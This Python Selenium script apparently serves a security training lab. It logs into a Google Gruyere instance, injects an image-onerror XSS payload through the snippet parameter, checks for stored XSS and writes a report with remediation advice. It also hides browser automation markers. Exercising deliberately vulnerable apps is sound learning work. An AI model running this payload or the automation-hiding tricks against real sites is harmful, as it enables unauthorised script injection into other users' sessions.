import sys
import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import urllib.parse

class GruyereXSS:
    def __init__(self, gruyere_id):
        self.gruyere_id = gruyere_id
        self.base_url = f"https://google-gruyere.appspot.com/{gruyere_id}/"
        self.driver = None
        
    def start_browser(self):
        chrome_options = Options()
        chrome_options.add_argument("--disable-notifications")
        chrome_options.add_argument("--disable-infobars")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.maximize_window()
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except:
            return False
    
    def login(self):
        login_url = f"{self.base_url}login"
        self.driver.get(login_url)
        time.sleep(2)
        
        self.driver.save_screenshot("login_page.png")
        
        username = self.driver.find_element(By.NAME, "uid")
        password = self.driver.find_element(By.NAME, "pw")
        
        username.send_keys("1234")
        password.send_keys("12345678")
        
        self.driver.save_screenshot("login_filled.png")
        
        try:
            submit = self.driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
            submit.click()
        except:
            password.send_keys(Keys.RETURN)
        
        time.sleep(3)
        
        current_url = self.driver.current_url
        if "login" not in current_url:
            self.driver.save_screenshot("after_login.png")
            return True
        return False
    
    def send_xss(self):
        payload = '<img src="nonexistent.jpg" onerror="alert(\'XSS\')">'
        encoded = urllib.parse.quote(payload, safe='')
        
        target = f"{self.base_url}newsnippet2?snippet={encoded}"
        self.driver.get(target)
        time.sleep(2)
        
        alert_found = False
        
        try:
            WebDriverWait(self.driver, 3).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            
            try:
                self.driver.save_screenshot("alert_open.png")
            except:
                pass
            
            alert.accept()
            alert_found = True
            time.sleep(1)
        except:
            pass
        
        if alert_found:
            self.driver.save_screenshot("xss_success.png")
        else:
            self.driver.save_screenshot("xss_sent.png")
        
        with open("response.html", "w", encoding="utf-8") as f:
            f.write(self.driver.page_source)
        
        return alert_found
    
    def check_stored(self):
        snippets_url = f"{self.base_url}snippets.gtl"
        self.driver.get(snippets_url)
        time.sleep(3)
        
        stored_found = False
        
        try:
            WebDriverWait(self.driver, 5).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            
            try:
                self.driver.save_screenshot("stored_alert.png")
            except:
                pass
            
            alert.accept()
            stored_found = True
            time.sleep(1)
        except:
            pass
        
        if stored_found:
            self.driver.save_screenshot("stored_confirmed.png")
        else:
            self.driver.save_screenshot("snippets_page.png")
        
        with open("snippets.html", "w", encoding="utf-8") as f:
            f.write(self.driver.page_source)
        
        return stored_found
    
    def create_report(self, reflected, stored):
        report_text = f"""
XSS Test Report
Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
Gruyere ID: {self.gruyere_id}
Base URL: {self.base_url}

Results:
Reflected XSS: {'SUCCESS' if reflected else 'FAILED'}
Stored XSS: {'SUCCESS' if stored else 'FAILED'}

Files:
login_page.png
login_filled.png
after_login.png
{'xss_success.png' if reflected else 'xss_sent.png'}
{'stored_confirmed.png' if stored else 'snippets_page.png'}
response.html
snippets.html

Vulnerabilities found:
- Reflected XSS via snippet parameter
- Stored XSS on snippets page
- No input validation
- JavaScript execution allowed

Recommendations:
1. Validate and sanitize user input
2. Implement Content Security Policy
3. Encode HTML entities on output
4. Regular security testing
"""
        
        with open("report.txt", "w", encoding="utf-8") as f:
            f.write(report_text)
    
    def execute(self):
        if not self.start_browser():
            return
        
        self.login()
        
        reflected = self.send_xss()
        
        stored = self.check_stored()
        
        self.create_report(reflected, stored)
        
        input()
        self.driver.quit()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)
    
    gruyere_id = sys.argv[1]
    exploiter = GruyereXSS(gruyere_id)
    exploiter.execute()
